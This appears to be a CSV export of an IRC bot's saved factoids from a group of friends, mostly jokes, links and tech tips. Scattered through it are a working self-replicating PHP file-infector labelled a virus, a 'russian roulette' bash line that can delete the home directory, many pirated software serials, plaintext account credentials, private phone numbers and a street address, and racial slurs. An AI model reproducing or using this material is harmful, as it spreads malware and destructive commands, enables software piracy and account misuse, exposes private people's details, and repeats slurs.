Key,Value,Username
vi syntax proper colors,:set background=dark,guan-w3rk
femguan,http://www.timbonicus.com/pix/femguan.jpg,bit-work
bush,"intelectual equivalent of a peanut, lump of coal, wood block, or other blunt object",Halfbeard
if gurov rode motorcycles,http://pixpls.com/i/gurovbike.jpg,Gand-w3rk
gosu,the korean god of games,Harblequin
dell windows 2003 sp1 registry_error,http://cp.xem.us,Gand-w3rk
harbl,"the short, stubby hairs between your sphincter and your scrotum",Maximus
eicar test virus,paste this into notepad and save as .com file X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*,Gand
maruth gift registry,"bed bath and beyond, target, hects, foleys amazon, and crate & barrel; name: matthew cornick",bishop`w
xp user,control userpasswords2,gurov-w3rk
trent scat,http://www.tindeck.com/audio/my?loc=2lk20-NINtendo-vox.mp3,yablo
latimes login,kos@dailykos.com / dailykos,Gand
food coma,vegtible like state induced by consumption of high protein or fat content foodstuffs and excacerbated by warm temperature,halfbeard
dell direct support extensions,877-773-3355 then http://solsar.com/j/dellsupport.htm,Gand-w3rk
taximod handling.cfg,TAXI            99000.0 2.1 5.4 1.6 0.0 0.0 -0.5 -75 2.50 0.9 0.52 5 9900.0 999.0 4 P 19.1 0.60 1 25.0 1.4 0.1 0.2 0.00 20000 0.25 -0.15 0.5 0.0 8002 0 1,yablo-w3rk
gand's custom functions,200000010 000110000,Gand
microsoft bluetooth uninstall,http://www.jsifaq.com/SUBR/tip8900/rh8938.htm,gurov-w3rk
opera menus and buttons,http://nontroppo.org/wiki/CustomButtons,Gand
junk show,"getting lost, breaking down, forgetting gear, forgetting to call people, gear packing delays, ...",sock
twow,shadowsong,Harl-c0rp
tjs,team junk show (dot com!),nathan2
kobald,cummed_on_maxi_grandpa,Harlequin
disneyworld,TEH GROTTO OF TEH MIKEz0R,sock
oracle tables,table_name from user_tables,lee`w
halfbeard english,like sasquatch and the lockness moster this does not exist,Halfbeard
waffuru,http://pixpls.com/i/waffuru.jpg,Gand-w3rk
eh uids,guan:1634106 bascule:5330400 yablo:5741526 bit:7618659,Gand-w3rk
ruby,"File.open('file') {|fin| fin.read.split(/ +/).inject {|sum, n| sum += n.to_i }} vs. php $line = file_get_contents('file'); array_sum(explode("" "", $line);",sargon2
bf2 awards,http://www.planetbattlefield.com/bf2/game/awards/,guan-w3rk
less code,always better,sargon2
minicom,THE WORST PIECE OF SHIT SOFTWARE EVER,Gand-treo
xp key change,http://www.petri.co.il/change_the_serial_in_windows_xp.htm,gurov-home2
tcpip.sys patcher,http://www.speedguide.net/files/xp_sp2/EvID4226Patch211a-en.zip,yablo-w3rk
crunch's blog,http://www.livejournal.com/users/broestls/,Gand-w3rk
vi highlight off,:syntax off,guan-w3rk
sargon's awesome php virus,"<?$c='foreach(glob(""*.php"") as $f){$d=file_get_contents($f);if(!strstr($d,""DY[<]1kz?(`!2)n6"")){file_put_contents($f,""<?\\$c="".chr(39).$c.chr(39)."";eval(\\$c);?>\n"".$d);break;}}';eval($c);?>",sargon2
ntest,a\nb,Gand-w3rk
no child left behind act,Let's Do Our Damndest To Ensure Every Student At An Underfunded School District Is Royally Fucked act,nathan2
gand's kittenwar kittens,http://kittenwar.com/kittens/32678/ and http://kittenwar.com/kittens/32679/,Gand
rb password,OHWAIT,guan-w3rk
revenge,So Sweet,Jesus
ipb,http://w3rd.net/ipb/2p0p0pf4.zip,gurov-home
it department mantra,"We the willing, led by the unknowing, are doing the impossible for the ungrateful. We have done so much, with so little, for so long, we are now qualified to do anything, with nothing.",yablo-w3rk
fix debian e2fsprogs,http://cyberciti.biz/nixcraft/forum/viewtopic.php?t=190,gurov-home
fourth best spam ever,"Sometimes cab driver inside laughs out loud, but power drill around always avoid contact with cream puff living with!cab driver from require assistance from prime minister near ruffian, or chestnut living with senator plan an escape from cloud formation around.mating ritual for vacuum cleaner is smelly.behind apartment building daydreams, because ruffian of tea party eat tornado from abstraction.",Gand
quicktime 7 key,Dawn M Fredette / 4UJ2-5NLF-HFFA-9JW3-X2KV,guantes
sagonet bitch number,866-510-4000,gandhathat
face!,http://www.vgcats.com/comics/?strip_id=161,nathan2
sa emoticons,http://tweekmonster.net/sa/emots/,nathan2
opera menu,http://fails.org/operamenu.html,Gand-w3rk
ultraedit 10.20a serial,Name: PDogs~ Single User License  Serials: 000017-B9YE4A-BCWDP3-N1N8VF-PEHWXR-TJRXXP-QKN6P3-AVRRPB-Y6PCWV-6E495R,Gand-w3rk
dell mbr fix,http://www.goodells.net/dellrestore/fixes.htm,galen-w3rk
"show extension on cnf, scf, url, etc",google for NeverShowExt,Gand-w3rk
superman's social security number,092-09-6616,Jesse
usps shipping,$0.37 + ( (Ounces - 1) * $0.23) + $0.12,guantes
disable autorun,KHLM\\curentcontrolset\\system\\services\\cdrom\\AutoPlay=0,galen-w3rk
mmorpg,mostly men online role playing girls,nathan2
ssl cgi-irc,https://secure.f3h.com/xem-cgi/irc.cgi,nathan2
ohgod2,http://is2.okcupid.com/users/148/576/14857772797272993261/t1105505320.jpg,sock
dailycamera,bouldernew@mailinator.com/getin,yablo-w3rk
wind chill,Wind chill F = 35.74 + 0.6215T - 35.75(V^0.16) + 0.4275(V^0.16) where T is temp in F and V is windspeed in mph,Gand
restore xp file associations (like zip),http://www.dougknox.com/xp/file_assoc.htm,Gand-w3rk
nema plug/receptacle reference chart,http://solsar.com/t/nemaplugchart.pdf,Gand-w3rk
iwork serial,CCFK-T4OG-FHG1-41G2-200F,nathan2
le parkour,http://video.google.com/videoplay?docid=-1854204693582154043&q=le+parkour,nathan
valinor uptime,"463 days, rebooted on 12/16/2005 by sago",GandWTF
roxio toast titanium 7 mac,0B-P0Z3H-5TVDV-HDQ68,nathan
uptime,pointless,Gand-w3rk
disable windows update restart nag,net stop wuauserv,lee
csu computer recycling hax,(970)491-1199,gurov-w3rk
ds friends,bit - 090257726393 || sarg - 077372294045 || joe - 270646/217346,joe
iwork06,WMPP-X3D3-P3DM-DCYX-MM4M-U6G,Yablo-w3rk
1u,1.75in,golgo
sushi,http://eugeneciurana.com/musings/sushi-eating-HOWTO.html,nathan2
sql sort,order,galen
lee's weekend plan,"Seduce climbing chicks at the gym, ski in deep powder, headshot 17 people in CS, grow the fro.",Halfbeard
duff,designated ugly fat friend,nathan
gurovbike,http://pixpls.com/lol/gurovbike.jpg,Gand
spore,going to ruin his life,nathan
avast key,W4580739H2600A1106-ENW3C992,galen
nt epoch time conversion factor,((1970-1601) * 365.242190) * 86400,Gand-w3rk
24,fox news' wet dream,nathan2
win2k adv svr,RBDC9-VTRC8-D7972-J97JY-PRVMG,galen
dslextreme bitch number,866 491 7221,Gand-treo
guantacle,http://solsar.com/gallery/displayimage.php?album=48&pos=6,Gand-w3rk
god hates,oracle,galen
seven s's,"sweet, sexy, smart, sane, single, std-free, straight",nathan
khow mms stream for coast to coast am listening,http://a1737.l1981244605.c19812.g.lm.akamaistream.net/D/1737/19812/v0001/reflector:44605,Jesse
ultraedit 12 serial,Name: www.serials.ws Serial: X2W1M-C4L0A-U9C0T-H0A3P,guantes
fort collins traffic code,http://www.colocode.com/ftcollins/traffic/fortcollins_traffic.htm,sargon
synergy rdp shift problem,http://sourceforge.net/tracker/index.php?func=detail&aid=1485936&group_id=59275&atid=490467,Gand-w3rk
fix for synergy rdp shift problem,http://sourceforge.net/tracker/index.php?func=detail&atid=490467&aid=1485936&group_id=59275,Gand-w3rk
opencanvas 4.06e+,GPEERA49-SABJ-W8K55NEA,sargon
dvd max filesize bytes,"4,294,967,296",Gand-w3rk
moniker.com,"worst registrar on the internet, don't ever use them",Gand
non-detaching screen,screen -x -blah-,bishop
vi mouse,:set mouse=a,guantes
leet tiles weight,258 grams or 0.568792636 pounds,guantes
oracle,"WORST DATABASE EVER, worse than mssql only because it's management tools are in bed with java",Gand-w3rk
poweriso serial,Serials.WS / 5NKU8-CFY3P-RDWZC-TVBBU-HY935,guantes
best way to disable wga,http://blogs.zdnet.com/Spyware/?p=831,Gand
cs3,"cute, smart, sane, single. (pick three)",nathan
cool dvd ripper,handbrake,bishop
ghost recon advanced warfighter serial,FDA5-GTRQ-BAE3-7YFK (case sensitive),guantes
rss,creates a personalized single-point-of-access which delivers a wide range of turnkey content and critical business information,guantes
invest to make per year,!calc <amount desired per year> / e^r-1,guantes
racist sprinkler,wop wop wop wop wop wop *CHINK*  niggerniggerniggerniggernigger,Gand-w3rk
ass vibrator,http://bash.org/?1578,Jesse
my ass,on fire,J-Roc_
best ze frank,http://www.zefrank.com/theshow/archives/2006/07/post_4.html and http://www.zefrank.com/theshow/archives/2006/08/080806.html,bishop
kim,"<maruth> there is this insane professor at our school who stalked brook shields and takes infinite pictures of women... i cought him taking pictures of himself with women and was like ""hey dr. kim can i take a picture of us together?!"" he was totaly shocked i totaly turned the tables on him and i have this pic now with him like 'wtf' and me like 'sucker!' its a great OWNED picture - http://www.glue.umd.edu/~cornick/random/kim.jpg",Gand-w3rk
winiso serial,Mahdi Azimi / 840D984F59744DACCB86319A0B9D552FCFE8BDFB183BB441,guantes
pitagora suicchi,http://youtube.com/watch?v=0XyWWQaW-ZU,Gand
ssh client,http://solsar.com/j/SSHSecureShellClient-3.2.9.exe,Gand
normal consulting rate,~60/hr,bishop
css thing,http://centricle.com/ref/css/filters/,bit
netinstall ubuntu,https://help.ubuntu.com/community/Installation/WindowsServerNetboot,sargon
gurov berry,1-848-228-0472,gurov-nj
gurov personal,1-970-980-9230,gurov-nj
clear qmail queue,for i in bounce info intd local mess remote todo; do find /var/qmail/queue/$i -type f -exec rm -v {} \\;; done,Gand-w3rk
amazon shipping filler,slickfillers.net,nathan
graw,6DHJ-GTUQ-KAE3-7YPX,guantes
coh (company of heroes) serial,3438-fdf3-fd15-7fa6-94b7,guantes
default password list (dpl),http://www.phenoelit.de/dpl/dpl.html,Jesse
penn & teller's bullshit,http://bullshitlinks.blogspot.com/,Jesse-laptop
web design color code,http://www.siteprocentral.com/html_color_code.html,Gand-w3rk
sendmail,"WORST MTA EVER, WORSE THAN POSTFIX",Gand-w3rk
ls colors,"""no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:*.rpm=01;31:*.jpg=01;35:*.png=01;35:*.gif=01;35:*.bmp=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.png=01;35:*.mpg=01;35:*.avi=01;35:*.fli=01;35:*.gl=01;35:*.dl=01;35:""",Gand-w3rk
emo hipster sargon,http://wvs.topleftpixel.com/archives/photos_people/061001_1697.shtml,Jesse
why java sucks,public static <T extends Object & Comparable<? super T>> T max(Collection<? extends T> coll),sargon
a bad idea,"eating mexican for lunch, dinner, and the following lunch",Gand-w3rk
fudge,tasty fuckin candy,bishop
bind,The Buggy Internet Name Daemon,bishop
stderr,asdf 2>&1 GODDAMMIT,guantes
win2k key,rbdc9-vtrc8-d7972-j97jy-prvmg,jake
sargip,71.218.60.127,guantes
foxpro,"WORST DATABASE EVER, WORSE THAN PLAINTEXT",Gand-w3rk
feeder,http://rssfeederdotnet.sourceforge.net/,Gand-w3rk
test1 test2 ,result1 result2,bishop
noie7 ,"[HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\\Setup\\7.0] ""DoNotAllowIE70""=dword:00000001",galen
natalie portman ,our generation's julia roberts,bishop
proe ,http://torrentspy.com/torrent/699307/9_17_5_PTC_PRO_ENGINEER_WILDFIRE_V2_M_15_MAGNiTUDE,bishop
bishop ssh ,ssh -p 10322 unux.mine.nu,bishop
cy's ham radio callsign ,kc0nsw kilo charlie zero november sierra whiskey,Jesse
minor failure ,complete failure,Gand-w3rk
gtube ,XJS*C4JDBQADN1.NSBN3*2IDNEN*GTUBE-STANDARD-ANTI-UBE-TEST-EMAIL*C.34X,Gand-w3rk
cy triumphant ,http://bash.org/?711655,Jesse-laptop
google desktop search operators ,http://desktop.google.com/features.html#advancedsearch,Gand-w3rk
dual layer dvd bytes ,"8,547,991,552",guantes
select random line ,n = 1; file.each_line { |line| keep = line if n * rand < 1.0 }; puts keep,bishop
function-try block ,\ntype_t func(args) try {\n ...\n} catch(exception &E) {\n ...\n},golgo__
pacman pie chart ,http://www.boingboing.net/2006/11/02/hilarious_piechartvi.html,Gand-w3rk
windows 2003 key ,M3QBB-98BV4-V2R6K-PJMQK-83BQY,Gand-w3rk
ppc 6700 no sms confirmation ,HKLM\\Software\\Microsoft\\Inbox\\SMSNoSentMsg 1,guantes
dell memory error ,"memory compare error, Bank4/5",guantes
good vodka brand ,belvedere,bishop
windows cli ldap query ,ldifde.exe,Gand-w3rk
vista disable security center popups ,http://chris123nt.com/guides/5365/,Gand
does not exist ,"terabyte hard drives, fiber to the home, spore",guantes
ihbihblria ,It Has Been Invented Here But Let.s Re-invent It Anyway,bishop
xbins ,irc.efnet.org #xbins /msg xbins !list,gurov
mac portable apps ,http://www.freesmug.org/portableapps/,J-Roc
j-roc's video blog ,http://www.clickcaster.com/j-rocs-greasy-trailer-park-hippie-slut-freakout,J-Roc
postgres tips ,alter user blah set log_statement=all; \\timing see how quickly the queries get back to you,bishop
sybase,"WORST DATABASE EVER, WORSE THAN DBASE II",Gand-w3rk
belvedere,"jesse's awesome vodka, which is polish",bishop
bascule's pngcrush options,-brute -rem cHRM -rem gAMA -rem iCCp -rem sRGB,RudeDog
cinemanow free movie,HPv197DBCD,guantes
huevo's blog,huevicus.blogspot.com,guantes
vista ntbackup,http://www.neowin.net/forum/lofiversion/index.php/t513969.html,Gand
better color thing,http://kuler.adobe.com,bishop
toilet,http://www.leftfield.org/~scott/misc/toilet.htm,gurov
joost invites,http://joost.com/presents/gigaom-newteevee/,J-Roc
fucked up grouphug,http://grouphug.us/confessions/769812628,golgo
blizz downloader torrent,d8:announce,guantes
non-free softs on debian,automatix,bishop
nanaca crash record,16421.14m (gand) http://pixpls.com/i/nanaca.jpg,Gand
turn off autoplay,"Start -> Run -> gpedit.msc Go to ""Administrative Templates"" -> ""System"". Next, doubleclick ""Turn off Autoplay"", check ""Enabled"" and select ""All drives"".",mike`w
color,0zero1one2two3three4four5five6six7seven8eight9nine10ten11eleven12twelve13thirteen14fourteen15fifteen,nathan
hex workshop serial,161660427-502701-9839,guantes
kendo practice sword,shinai,bishop
caffeine content of soft drinks,"Coca-Cola (33.9 mg/12 oz), Diet Coke (46.3 mg/12 oz), Pepsi (38.9 mg/12 oz), Diet Pepsi (36.7 mg/12 oz), Dr Pepper (42.6 mg/12 oz), Diet Dr Pepper (44.1 mg/12 oz), Mountain Dew (54.8 mg/12 oz), and Diet Mountain Dew (55.2 mg/12 oz)",bishop
mixed drinks,cocktaildb.com,J-Roc
google for science,http://www.scirus.com/,sargon
real jackalope,http://en.wikipedia.org/wiki/Shope_papillomavirus,bishop
erlang examples,http://media.pragprog.com/titles/jaerlang/code/,bascule
challenge,http://portlanderlang.org/challenge-beta/923788800000.html,bascule
alcoholic drinks list,http://en.wikipedia.org/wiki/IBA_Official_Cocktail,bishop
old old old oldfeh,"216.75.30.90 or something, wtf",guantes
irssi timezone update,/script exec $ENV{'TZ'}='America/Denver';,guantes
html link open new window,_blank,guantes
waygay,Migraines are,LindsayLohan
random password,"O%TLuDRVRTDCvDILHYoyLlw>*c,+wYM (Make sure you write this down because it will be needed for future upgrades)",guantes
uninstall u3,http://www.mydigitallife.info/2006/09/11/disable-remove-and-uninstall-u3-launchpad/,Gand
wii friend codes,4377 7339 1304 0322 (J-Roc),J-Roc
best confession,130993052,Gand-w3rk
ron,3038179334,LindsayLohan
elseif,"javascript: else if, php: elseif, perl: elsif, python: elif",guantes
pbr building code,5840,Gand-w3rk
ultraedit tab bar,"Pull down menu ""View"" --> ""Views/Lists"" --> ""Open File Tabs""",Gand-w3rk
fix apt pubkey,http://www.mepis.org/docs/en/index.php/Public_key_not_available_error,gurov-w3rk
f(-_-f),http://guantes.f3h.com/f(-_-f).jpg,guantes
david,old fart,LindsayLohan
macfag,golgo,LindsayLohan
php require from relative path,"require_once(dirname(__FILE__) . ""file.php"");",guantes
mr. nut,Tachyon,LindsayLohan
compgeeks,http://gurov.us/_ads_/go/75,gurov-w3rk
spreadshirt toilet,http://www.spreadshirt.com/us/US/-/Designs-3181/User/Profile/marketplaceDesigns/page/12,J-Roc
rbl,http://www.ioncannon.net/dnsbl/,gurov-w3rk
winxp wga loopback,http://spacebag.googlepages.com/,nathan
sprint blackberry bitch number,877-654-9111 option 2,gurov-nj_
simplicity challenged,unless [1].member?(ARGV.length),guantes
bitwize's corollary,"Any sufficiently complicated Common Lisp or Scheme program will eventually be rewritten in C++, Java, or Python.",bishop
monkeysphere,http://www.pointlesswasteoftime.com/monkeysphere.html,sargon
j-roc's ray-bans,http://www.georgiashades.com/pd_rayban_2113.cfm,J-Roc
cloverfield,in.sane.,LindsayLohan
airplane on conveyor belt,http://www.straightdope.com/columns/060203.html,sargon
things jesse is better at than you,"school, art, music,",sargon
things macbook air has,"1 usb port, microdvi, backlit keyboard, bright LED screen, ssd capability, mac os x,",J-Roc
media priority,Economy = boom  < Dead celeb,galen
hl key,2128-82043-0447,gurov-home
gurovaddress,"3106 Hyde Park Court, Freehold, NJ, 07728",gurov-home
gurov ladders,646 592 0810,gurov-home
computer,pr0nsicle,P-Money
guanitors,http://guantes.f3h.com/guanmonitors.jpg,bishop
things macbook air doesn't have,"ethernet, optical drive, fullsize dvi, user replaceable battery, pccard slot, firewire, right click button, 'thinnest laptop ever' claim",sargon
things constable rocket cannot do,love,guantes
things sargon doesn't have,expression of concerns in forms other than lists,bascule
canon,god,baronvoncanon
nikon,faster and more intuitive,LordNikon
fancy putty,http://www.xs4all.nl/~whaa/putty/,guantes
things modbook doesn't have,"keyboard, screen rotation",sargon
things sargon has,too much time to make lists,golgo
psucalculator,http://www.extreme.outervision.com/psucalculatorlite.jsp,joe
xp cd key,R3W6Q-8JPFB-KJF9W-GVW27-9X6WD,guantes
regex to match c comments,/\/\*[^*]*(\*([^*/][^*]*)?)*\*\//,sargon
ultimate fizzbuzz solution,"(1..100).map {|i| srand(1781773465) if (i%15)==1; [i, ""Fizz"", ""Buzz"", ""FizzBuzz""][rand(4)]}",nathan
firefox prevent window resize,about:config dom.disable_window_move_resize,Gand-w3rk
things treo has,"plastic, buttons, a battery",Gand-w3rk
good telescope coatings,http://www.spectrum-coatings.com/,bishop
mhall2,the guy whose chin acts as a holder for pj's nuts,pj
a joe shirt,http://www.magicalomaha.com/wolf%20shirts/timber.jpg,J-Roc
stderr to stdout,2>&1,guantes
escher addy,"1407 KENWOOD CT 80525 http://maps.google.com/maps?f=q&hl=en&geocode=&q=1407+Kenwood+Ct,+Fort+Collins,+CO+80525&sll=40.561756,-105.049878&sspn=0.007254,0.008025&ie=UTF8&ll=40.563471,-105.05201&spn=0.005225,0.013239&z=17&layer=c&cbll=40.561773,-105.049826&cbp=1,200.00000000000017,,0,5",bishop
^._.^,http://www.batconservation.org/bat%20images/vamp1.jpg,joe
the answer,it gets a security exception and won't run,guantes
beans,fnord,bishop
bishop's place,named escher house,bishop
giyf,Google it you fucker,bishop
snake style,http://guantes.f3h.com/(f-_-)f.jpg,joe-work
prime regex,class Fixnum; def prime?; ('1' * self) !~ /^1?$|^(11+?)\1+$/; end; end,nathan
opme module,/quote modload m_opme.so,guantes
things that don't work on 64-bit,flash,sargon
army gurov,http://englishrussia.com/images/belarus_special/1.jpg,J-Roc
newfeh,216.75.62.7,sargon
:d,http://suppleninja.net/~guantes/colond.jpg,guantes
life,pain,guantes
fud,the only thing sargon can offer,J-Roc
enough,six,guantes
rattlesnake bite,http://www.rattlesnakebite.org/rattlesnakepics.htm,joe-work
quake live / qlive tips,http://quakefour.net/ql/,guantes
pedo,sam-i-am,sock
vmware vi client,host:8333/client/VMware-viclient.exe,guantes
ohgod3,http://cdn.okcimg.com/php/load_okc_image.php/images/578x128/1140x690/0/16201829229632115076.jpeg___150_500_150_600_08a9f2db_.jpg,sock
flash installer,http://www.adobe.com/products/flashplayer/fp_distribution3.html,blue
spray paint,http://www.explosm.net/comics/1356/,sargon
3d fastmarks,9435,guantes
vista,http://www.winhelponline.com/blog/run-dialog-autocomplete-drop-down-feature-does-not-work/,sargon
get rid of msg windows,/window kill,guantes
the command to recall something remembered,!whatis,Harlequin
guan's 256gb samsung guess,$500,guantes
p-'s 256gb samsung guess,$998,p-Money
napalmman's 256gb samsung guess,$1100,napalmman
sarg's 256gb samsung guess,$650,sargon
boulder police non-emergency number,303-441-3333,J-Roc
sarg <3,davidbesen.com/heart,joe-work
ops,/quote modload m_ojoin.so ; /quote ojoin #@chan,guantes
spiral octopus,http://www.youtube.com/watch?v=SCAIedFgdY0,joe
ronald reagan,saved you from being chemically rearranged,guantes
nifty zip,http://benfry.com/zipdecode/,joe-work
lachesis issue,z-axis tracking,sargon
daemon tools alternative,virtual clonedrive,guantes
why gta4 > sr2,https://tv.rockstargames.com/videos/view/id/73A7D0AFC0455BC7,joe-work
xcopy,xcopy source destination /E /V /C /F /H,galen
professor besen,http://j.xem.us/beard.jpg,bit-work
flicker,http://photography.nationalgeographic.com/photography/enlarge/birds-rondeau-park.html,joe-work
scamwich,http://magazinely.com/pics/omg-i-would-be-veeeery-angry-if-i-got-that-sandwhich,gurov
mary had a little lamb,http://t.xem.us/enb.txt,sargon
turn off source engine bs,cl_interpolate 0; cl_extrapolate 0; cl_lagcompensation 0; cl_predict 0; cl_showerror 1; cl_smooth 0;,sargon
p-build,http://secure.newegg.com/WishList/PublicWishDetail.aspx?WishListNumber=11493048,guantes
sarg-build,http://secure.newegg.com/WishList/PublicWishDetail.aspx?WishListNumber=11173066,guantes
\,escape,sargon
how many,OVER 9000,sargon
complaining,NO,sargon
quote ignore rb,prepend ^[^<]+<([^r]|r([^b]|$)).*,sargon
l2,learn to,bishop
d5000 filter size,52mm,guantes
color thing,http://colorschemedesigner.com/,bit
vbox shared folder,mount -t vboxsf,sargon
disable firefox color management,"about:config, gfx.color_management.mode = 0",guantes
reactivate xp wga,http://support.microsoft.com/kb/328874,guantes
irc quotes,http://g.xem.us/quotes/,guantes
openvpn tutorial,http://www.ventanazul.com/webzine/articles/openvpn-ubuntu-and-hulu,guantes
hpj,already.be,guantes
setfacl,setfacl --default --modify group:users:rw- -R /dir,guantes
synergy,http://code.google.com/p/synergy-plus/,sargon
get ops,/quote opme #chan,guantes
steampunk,what happens when goths discover brown,nathan
the anti-life equation,"loneliness+alienationfear+despair+self-worth÷mockery÷condemnation÷misunderstandingxguiltxshamexfailurexjudgment n=y where y=hope and n=folly, love=lies, life=death, self=dark side",jessek
!echo,!echo,Gand-w3rk
apostrophe,http://www.angryflower.com/bobsqu.gif,Gand-w3rk
source vsync fix,+fps_max 59.9,guantes
cthulhu ascii art,"(\(;,,,;)/)",bishop
look of frustration,ಥ_ಥ,bascule
look of disapproval,ಠ_ಠ,sargon
ie,"worst browser ever, worse than access",guantes
white whale holy grail,http://www.cultreviews.com/img/white_whale.png,sargon
things sarg's phone doesn't have,"multitouch, high-res screen",Gand-w3rk
things the droid doesn't have,"100k apps, multitouch in gmaps/browser, standard miniusb, simultaneous voice+data, logmein",sargon
unicode,100x slower than ascii,p-Money
youtube time jigger,#t=XmXs,joe-work
<3,♥,sargon
o/~,♪ (also ♫),sargon
:),☺ or ☻,sargon
#,a barren wasteland of desecrated viscera,guantes
ditto,〃,sargon
firefox prevent javascript disabling things,about:config set dom.disable_window* to true,sargon
japanese,日本語,sargon
the hammer,my penis,guantes
cutepdf writer,http://www.cutepdf.com/Products/CutePDF/writer.asp,Gand-w3rk
floating point,if(0.7 + 0.1 == 0.8) evaluates to false,sargon
google dns,8.8.8.8 / 8.8.4.4,sargon
google from firefox address bar,"about:config, keyword.URL -> http://www.google.com/search?q=",guantes
infinity,∞,sargon
broken rb commands,imbd,bishop
gurov wireless,http://solsar.com/pixpls.com/lol/wireless1.jpg,Gand-w3rk
win7 godmode,GodMode.{ED7BA470-8E54-465E-825C-99712043E01C},J-Roc
temperature data,http://ols.nndc.noaa.gov/plolstore/plsql/olstore.prodspecific?prodnum=C00095-PUB-A0001#TABLES,sargon
things that suck about thinkpads,"ctrl/fn key placement, wireless radio that turns off randomly, tons of shitty useless apps that slow things down, something that makes windows 7 crash when it never crashes ever on other PCs",Gand
ff compatibility checking,http://kb.mozillazine.org/Updating_extensions,sargon
clear linux filesystem cache,sync; echo 3 > /proc/sys/vm/drop_caches,guantes
ae,æ,sargon
catbeards,MURDER,bishop
ultramon,www.serials.ws 2206727194,sargon
firefox win7 taskbar,"about:config then browser.taskbar.previews.enable true, BETA",blue
professor badass,http://i43.tinypic.com/2wp5p4z.jpg,p-zilla
bascule's adjective,abrasive,guantes
(f-_-)f,http://v.f3h.com/~guantes/(f-_-)f.jpg,guantes
ups tracking number,http://osiris.978.org/~alex/ups.html,sargon
!hst,hunter s. thompson,sargon
!dec,Francis E. Dec,sargon
!bob,"J.R. ""Bob"" Dobbs, the figurehead of the Subgenius Foundation",sargon
what glue,thistothat.com,sargon
fix test_error steam,internet explorer/tools/internet options/connections/lan settings/uncheck autodetect settings,p-zilla
vista win7 network fix,2nd post - http://hardforum.com/showthread.php?t=1311483,joe
automatic update,http://support.microsoft.com/kb/328010,blue
years without yablo bots,0,bit-work
hatcave,http://24.media.tumblr.com/tumblr_kyhdy8bgxK1qzc6tso1_500.jpg,nathan
bad romance,RAH² AH³ ROMA² MA GA² OOH LA²,bascule
hanns-g,http://www.newegg.com/Product/Product.aspx?Item=N82E16824254026,guantes
ke$ha,http://i.imgur.com/umB81.jpg,J-Roc
babies,really dumb,guantes
javascript edit,javascript:document.body.contentEditable='true'; document.designMode='on'; void 0,yablo
win 7 adminpak,http://www.microsoft.com/downloads/details.aspx?FamilyID=7d2f6ad7-656b-4313-a005-4e344e43997d&displaylang=en,yablo
comcast cap info,http://www.dslreports.com/forum/r21032722-Bandwidth-Limits-All-discussion-here,sargon
borderlands save editor,http://gbxforums.gearboxsoftware.com/showthread.php?t=88209,sargon
old steam shortcuts,"""C:\Program Files (x86)\Steam\Steam.exe"" -applaunch <app ID>",guantes
win7 real quicklaunch,http://www.howtogeek.com/howto/windows-7/add-the-quick-launch-bar-to-the-taskbar-in-windows-7/,joe
sysinternals,\\live.sysinternals.com\tools,yablo
cs5 mac,https://www.adobe.com/cfusion/tdrc/index.cfm?product=master_collection user uhnope@yahoo.com pass uhnothx / 1325-0621-9125-0765-3648-0614 (shitlist activate.adobe.com in /etc/hosts),yablo
swastika,卐,sargon
excel insert row,alt i r,guantes
google background adblock filter,|http://www.google.com/images/background/*,yablo
qotd,g.xem.us/quotes,sargon
bash russian roulette,"[ $[ $RANDOM % 6 ] == 0 ] && rm -rf ~/. || echo ""*Click*""",yablo
appsync repo,cydia.hackulo.us,yablo
get ops in a channel,"be oper, then /part, then /quote ojoin @#chan",sargon
ghana,http://solsar.com/pixpls.com/gif/ghana.gif,Gand
clear flash cache,http://www.macromedia.com/support/documentation/en/flashplayer/help/settings_manager07.html,sargon
install stuff,http://ninite.com/,sargon
calculate all prime numbers from 1 to r in k,(!R)@&{&/x!/:2_!x}'!R,sargon
a,B,Gand
abcd,DCBA,p-money
backslash_n,\n,sargon
\n,\\n,p-money
newline,LEFT CURRY BRACKET BR RIGHT CURRY BRACKET,guantes
html newline,<br>,p-money
spankins,{BR}  _o/{BR}or2Z,bishop
{br},{BR},sargon
bread,http://v.f3h.com/~guantes/breads.jpg,guantes
